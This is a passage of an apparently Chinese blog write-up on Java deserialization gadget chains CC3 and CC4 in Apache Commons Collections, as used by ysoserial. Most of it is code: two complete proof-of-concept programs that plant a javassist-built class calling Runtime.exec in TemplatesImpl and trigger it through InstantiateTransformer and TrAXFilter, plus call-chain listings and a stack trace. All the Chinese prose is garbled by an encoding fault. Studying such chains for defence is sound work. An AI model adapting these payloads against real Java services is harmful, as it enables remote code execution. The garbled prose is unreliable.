<p>Apache Commons Collections ÂÆò‚ΩÖÂú® 2015 Âπ¥Â∫ïÂæóÁü•Â∫èÂàóÂåñÁõ∏ÂÖ≥ÁöÑÈóÆÈ¢òÂêéÔºåÂ∞±Âú®‰∏§‰∏™ÂàÜ‚ΩÄ ‰∏äÂêåÊó∂ÂèëÂ∏É‰∫ÜÊñ∞ÁöÑÁâàÊú¨Ôºå4.1 Âíå 3.2.2„ÄÇÂÖàÁúã 3.2.2ÔºåÈÄöËøá diff ÂèØ‰ª•ÂèëÁé∞ÔºåÊñ∞Áâà‰ª£Á†Å‰∏≠Â¢ûÂä†‰∫Ü‚ºÄ‰∏™‚ΩÖÊ≥ï FunctorUtils#checkUnsafeSerialization Ôºå‚Ω§‰∫éÊ£ÄÊµãÂèçÂ∫èÂàóÂåñÊòØÂê¶ÂÆâÂÖ®„ÄÇÂ¶ÇÊûúÂºÄÂèëËÄÖÊ≤°ÊúâËÆæÁΩÆÂÖ®Â±ÄÈÖçÁΩÆ org.apache.commons.collections.enableUnsafeSerialization=true ÔºåÂç≥ÈªòËÆ§ÊÉÖÂÜµ‰∏ã‰ºö ÊäõÂá∫ÂºÇÂ∏∏„ÄÇ Ëøô‰∏™Ê£ÄÊü•Âú®Â∏∏‚ªÖÁöÑÂç±Èô© Transformer Á±ªÔºàInstantiateTransformer „ÄÅ InvokerTransformer „ÄÅ PrototypeFactory „ÄÅ CloneTransformer Á≠âÔºâÁöÑ readObject ‚æ•Ëøõ‚æèË∞É‚Ω§ÔºåÊâÄ‰ª•ÔºåÂΩìÊàë‰ª¨ÂèçÂ∫èÂàóÂåñÂåÖÂê´Ëøô‰∫õÂØπË±°Êó∂Â∞±‰ºöÊäõÂá∫‚ºÄ‰∏™ÂºÇÂ∏∏„ÄÇ</p>
<p>ÂêåÊó∂ÔºåÂºÄÂèëËÄÖ‰ª¨‚æÉÁÑ∂‰ºöÂéªÊâæÂØª‚ºÄÁßçÂÆâÂÖ®ÁöÑËøáÊª§‚ΩÖÊ≥ïÔºåÁ±ª‰ºº SerialKiller ËøôÊ†∑ÁöÑ‚ºØÂÖ∑Èöè‰πãËØû‚Ω£„ÄÇ SerialKiller ÊòØ‚ºÄ‰∏™ Java ÂèçÂ∫èÂàóÂåñËøáÊª§Âô®ÔºåÂèØ‰ª•ÈÄöËøá‚øäÂêçÂçï‰∏é‚Ω©ÂêçÂçïÁöÑ‚ΩÖÂºèÊù•ÈôêÂà∂ÂèçÂ∫èÂàóÂåñÊó∂ÂÖÅËÆ∏ÈÄöËøáÁöÑÁ±ª„ÄÇÂú®<code>SerialKiller</code>‰∏≠Â∞±ÊúâËøáÊª§<code>InvokerTransformer</code>„ÄÇ</p>
<p>ÈíàÂØπÊ≠§ÊÉÖÂÜµ<code>ysoserial</code>ÁöÑ CC3 Áî®<code>InstantiateTransformer</code>ÊõøÊç¢<code>InvokerTransformer</code>ÔºåÂêåÊó∂‰ΩøÁî®‰∫Ü<code>TrAXFilter</code></p>
</blockquote>
<p>‰∏ãÈù¢‰ªãÁªçÁöÑÊòØ ysoserial ‰∏≠<code>TrAXFilter</code>Á±ªË∞ÉÁî®<code>newTransformer</code>ÁöÑÊñπÂºè‰ª•Âèä<code>InstantiateTransformer</code></p>
<h5 id="TrAXFilter"><a href="#TrAXFilter" class="headerlink" title="TrAXFilter"></a>TrAXFilter</h5><p><code>TrAXFilter</code>ÊûÑÈÄ†ÊñπÊ≥ï</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">TrAXFilter</span><span class="hljs-params">(Templates templates)</span>  <span class="hljs-keyword">throws</span></span><br><span class="hljs-function">        TransformerConfigurationException</span><br><span class="hljs-function">    </span>&#123;<br>        _templates = templates;<br>        _transformer = (TransformerImpl) templates.newTransformer();<br>        _transformerHandler = <span class="hljs-keyword">new</span> TransformerHandlerImpl(_transformer);<br>        _useServicesMechanism = _transformer.useServicesMechnism();<br>    &#125;<br></code></pre></td></tr></table></figure>

<h5 id="InstantiateTransformer"><a href="#InstantiateTransformer" class="headerlink" title="InstantiateTransformer"></a>InstantiateTransformer</h5><p>chained Â¶Ç‰ΩïÂéªËß¶Âèë<code>TrAXFilter</code>ÁöÑÊûÑÈÄ†ÊñπÊ≥ïËøõËÄåË∞ÉÁî®<code>newTransformer</code>ÔºåCC3 Áî®‰∫Ü‰∏Ä‰∏™<code>InstantiateTransformer</code>Á±ª</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">transform</span><span class="hljs-params">(Object input)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (input <span class="hljs-keyword">instanceof</span> Class == <span class="hljs-keyword">false</span>) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> FunctorException(<br>                    <span class="hljs-string">&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span><br>                        + (input == <span class="hljs-keyword">null</span> ? <span class="hljs-string">&quot;null object&quot;</span> : input.getClass().getName()));<br>            &#125;<br>            Constructor con = ((Class) input).getConstructor(iParamTypes);<br>            <span class="hljs-keyword">return</span> con.newInstance(iArgs);<br>            ...<br></code></pre></td></tr></table></figure>

<p>ËøôÈáåÊää<code>input</code>ËÆæÁΩÆ<code>TrAXFilter</code>ÔºåÈÇ£‰πàÂ∞±‰ºöÂú®ËøôÈáåÂÆû‰æãÂåñÁöÑÊó∂ÂÄôË∞ÉÁî®ÂÖ∂ÊûÑÈÄ†ÊñπÊ≥ïÔºåËøõËÄåË∞ÉÁî®<code>TemplatesImpl#newTransformer</code>ÊúÄÂêé RCE</p>
<p>Â¶Ç‰ΩïË∞ÉÁî®Âà∞Ëøô‰∏™<code>chainedTransformer</code>ÊòØ CC2 ‰∏≠ LazyMap ‰∏≠ÂÆûÁé∞ÁöÑÔºå‰∏çÂÜçËµòËø∞~</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC3;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC3</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object o, String fieldName, Object value)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class clz = o.getClass();<br>            Field declaredFiled = clz.getDeclaredField(fieldName);<br>            declaredFiled.setAccessible(<span class="hljs-keyword">true</span>);<br>            declaredFiled.set(o, value);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        ClassPool cp = ClassPool.getDefault();<br>        cp.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        CtClass ctc = cp.makeClass(<span class="hljs-string">&quot;Evil&quot;</span>);<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;<br><br>        ctc.makeClassInitializer().insertBefore(cmd);<br>        ctc.setSuperclass(cp.get(AbstractTranslet.class.getName()));<br>        <span class="hljs-keyword">byte</span>[] classbytes = ctc.toBytecode();<br>        <span class="hljs-keyword">byte</span>[][] targetclassbytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;classbytes&#125;;<br>        TemplatesImpl templatesimpl = <span class="hljs-keyword">new</span> TemplatesImpl();<br><br>        setFieldValue(templatesimpl, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(templatesimpl, <span class="hljs-string">&quot;_bytecodes&quot;</span>, targetclassbytes);<br><span class="hljs-comment">//        setFieldValue(templatesimpl, &quot;_class&quot;, null);</span><br><span class="hljs-comment">//        setFieldValue(templatesimpl, &quot;_tfactory&quot; ,new TransformerFactoryImpl());</span><br><br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(TrAXFilter.class),<br>                <span class="hljs-keyword">new</span> InstantiateTransformer(<span class="hljs-keyword">new</span> Class[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;templatesimpl&#125;)<br>        &#125;);<br><br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        LazyMap decorate = (LazyMap) LazyMap.decorate(hm, chainedTransformer);<br><br>        Constructor declaredConstructor = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);<br>        declaredConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br>        InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Target.class, decorate);<br><br>        Map proxymap = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> Class[]&#123;Map.class&#125;, invocationHandler);<br>        InvocationHandler handler = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxymap);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(handler);<br>        oos.flush();<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="CommonsCollections4"><a href="#CommonsCollections4" class="headerlink" title="CommonsCollections4"></a>CommonsCollections4</h2><h3 id="Pre-3"><a href="#Pre-3" class="headerlink" title="Pre"></a>Pre</h3><h4 id="ÈôêÂà∂-3"><a href="#ÈôêÂà∂-3" class="headerlink" title="ÈôêÂà∂"></a>ÈôêÂà∂</h4><blockquote>
<p>jdk ÊöÇÊó†ÈôêÂà∂</p>
<p>CommonsCollections 4.0</p>
</blockquote>
<h4 id="Âà©Áî®Èìæ-3"><a href="#Âà©Áî®Èìæ-3" class="headerlink" title="Âà©Áî®Èìæ"></a>Âà©Áî®Èìæ</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>heapify<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>sift<span class="hljs-constructor">Down()</span><br>                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>sift<span class="hljs-constructor">DownUsingComparator()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TransformingComparator</span>.</span></span>compare<span class="hljs-literal">()</span><br>                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InstantiateTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                            <span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span><br>                                TrAXFilter#<span class="hljs-constructor">TrAXFilter()</span><br>                                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Transformer()</span><br>                                         <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">TransletInstance()</span><br>                                         <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>defineTransletClasses<br>                                         <span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span><br>                                            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure>

<h4 id="ÂÖ≥ÈîÆÁ±ª-3"><a href="#ÂÖ≥ÈîÆÁ±ª-3" class="headerlink" title="ÂÖ≥ÈîÆÁ±ª"></a>ÂÖ≥ÈîÆÁ±ª</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs awk">TrAXFilter<br>Templates<br>TemplatesImpl<br>InstantiateTransformer <span class="hljs-regexp">//</span>ÊõøÊç¢InvokerTransformer<br><br>ClassPool<br>CtClass<br>AbstractTranslet<br><br>Transformer<br>ConstantTransformer<br>ChainedTransformer<br><br>HashMap<br>LazyMap<br><br>AnnotationInvocationHandler<br>Proxy<br></code></pre></td></tr></table></figure>

<p>CC4 ÊòØ CC2+CC3 ÁöÑÂèò‰ΩìÔºåby the wayÔºåseebug ÈáåÈù¢ÁöÑ poc ÊàëÊÑüËßâÊòØË¥¥Èîô‰∫Ü CC2 ÁöÑ</p>
<p>Âú® CC2 ÁöÑÂà©Áî®ËÉåÊôØ‰∏ãÔºåÊîπËøõ PriorityQueue Âà©Áî®ÈìæÔºöÂõ†‰∏∫ CommonsCollections4 Èô§ 4.0 ÁöÑÂÖ∂‰ªñÁâàÊú¨ÂéªÊéâ‰∫Ü <code>InvokerTransformer</code>ÁöÑ Serializable ÁªßÊâøÔºåÂØºËá¥Êó†Ê≥ïÂ∫èÂàóÂåñÊâÄ‰ª•‰æøÊúâ‰∫Ü CC4ÔºåCC4 Âè™ÊòØÂ∞Ü CC2 ‰∏≠ÁöÑ <code>InvokerTransformer</code>ÊõøÊç¢‰∏∫‰∫Ü<code>InstantiateTransformer</code></p>
<h3 id="Gadget-3"><a href="#Gadget-3" class="headerlink" title="Gadget"></a>Gadget</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC4;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC4</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object o, String fieldName, Object value)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class clz = o.getClass();<br>            Field declaredFiled = clz.getDeclaredField(fieldName);<br>            declaredFiled.setAccessible(<span class="hljs-keyword">true</span>);<br>            declaredFiled.set(o, value);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        ClassPool cp = ClassPool.getDefault();<br>        cp.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        CtClass ctc = cp.makeClass(<span class="hljs-string">&quot;Evil&quot;</span>);<br>        ctc.setSuperclass(cp.get(AbstractTranslet.class.getName()));<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;<br>        ctc.makeClassInitializer().insertBefore(cmd);<br><br>        <span class="hljs-keyword">byte</span>[] classbytes = ctc.toBytecode();<br>        <span class="hljs-keyword">byte</span>[][] targetclassbytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;classbytes&#125;;<br>        TemplatesImpl templatesimpl = <span class="hljs-keyword">new</span> TemplatesImpl();<br><br>        setFieldValue(templatesimpl, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(templatesimpl, <span class="hljs-string">&quot;_bytecodes&quot;</span>, targetclassbytes);<br><br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(TrAXFilter.class),<br>                <span class="hljs-keyword">new</span> InstantiateTransformer(<span class="hljs-keyword">new</span> Class[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;templatesimpl&#125;),<br>        &#125;);<br><br>        TransformingComparator transformingComparator = <span class="hljs-keyword">new</span> TransformingComparator(chainedTransformer);<br>        PriorityQueue queue = <span class="hljs-keyword">new</span> PriorityQueue();<br><span class="hljs-comment">//        PriorityQueue queue = new PriorityQueue(2,transformingComparator);</span><br>        setFieldValue(queue,<span class="hljs-string">&quot;size&quot;</span>,<span class="hljs-number">2</span>);<br>        setFieldValue(queue,<span class="hljs-string">&quot;comparator&quot;</span>,transformingComparator);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(queue);<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ËøôÈáåÂèëÁé∞<code>new PriorityQueue(1)</code>ÂêéÂÜçÂèçÂ∞ÑËÆæÁΩÆ‰∫Ü<code>size=2</code>ÔºåÂç¥Âπ∂Ê≤°ÊúâËß¶ÂèëÔºåÊúâÂ¶Ç‰∏ãÊä•Èîô</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Exception <span class="hljs-keyword">in</span> thread <span class="hljs-string">&quot;main&quot;</span> java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.ArrayIndexOutOfBoundsException</span>: <span class="hljs-number">1</span><br>	at java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.PriorityQueue</span><span class="hljs-selector-class">.writeObject</span>(PriorityQueue<span class="hljs-selector-class">.java</span>:<span class="hljs-number">770</span>)<br>	at sun<span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.NativeMethodAccessorImpl</span><span class="hljs-selector-class">.invoke0</span>(Native Method)<br>	at sun<span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.NativeMethodAccessorImpl</span><span class="hljs-selector-class">.invoke</span>(NativeMethodAccessorImpl<span class="hljs-selector-class">.java</span>:<span class="hljs-number">62</span>)<br>	at sun<span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.DelegatingMethodAccessorImpl</span><span class="hljs-selector-class">.invoke</span>(DelegatingMethodAccessorImpl<span class="hljs-selector-class">.java</span>:<span class="hljs-number">43</span>)<br>	at java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.Method</span><span class="hljs-selector-class">.invoke</span>(Method<span class="hljs-selector-class">.java</span>:<span class="hljs-number">497</span>)<br>	at java<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.ObjectStreamClass</span><span class="hljs-selector-class">.invokeWriteObject</span>(ObjectStreamClass<span class="hljs-selector-class">.java</span>:<span class="hljs-number">1028</span>)<br>	at java<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.ObjectOutputStream</span><span class="hljs-selector-class">.writeSerialData</span>(ObjectOutputStream<span class="hljs-selector-class">.java</span>:<span class="hljs-number">1496</span>)<br>	at java<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.ObjectOutputStream</span><span class="hljs-selector-class">.writeOrdinaryObject</span>(ObjectOutputStream<span class="hljs-selector-class">.java</span>:<span class="hljs-number">1432</span>)<br>	at java<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.ObjectOutputStream</span><span class="hljs-selector-class">.writeObject0</span>(ObjectOutputStream<span class="hljs-selector-class">.java</span>:<span class="hljs-number">1178</span>)<br>	at java<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.ObjectOutputStream</span><span class="hljs-selector-class">.writeObject</span>(ObjectOutputStream<span class="hljs-selector-class">.java</span>:<span class="hljs-number">348</span>)<br>	at CommonsCollections<span class="hljs-selector-class">.CC4</span><span class="hljs-selector-class">.CC4</span><span class="hljs-selector-class">.main</span>(CC4<span class="hljs-selector-class">.java</span>:<span class="hljs-number">64</span>)<br></code></pre></td></tr></table></figure>

<p>‰ΩÜÂú® CC2 ‰∏≠ÊèêÂà∞</p>
<blockquote>
<p>PriorityQueue ÊûÑÈÄ†ÊñπÊ≥ï‰∏∫‰ªÄ‰πà‰º†ÂÖ•(1)Ôºå‰πüÂèØ‰ª•‰º†ÂÖ•(1,transformingComparator)Âêé add ‰∏§Ê¨°ÔºåÊàñËÄÖÂèçÂ∞Ñ‰∏ç‰º†ÂÖ•ÂèÇÊï∞ÈÉΩÂèØ‰ª•Ëß¶Âèë</p>
</blockquote>
<p>Êàë‰ª¨Ê≥®ÊÑèÂà∞ CC2 ‰∏≠</p>
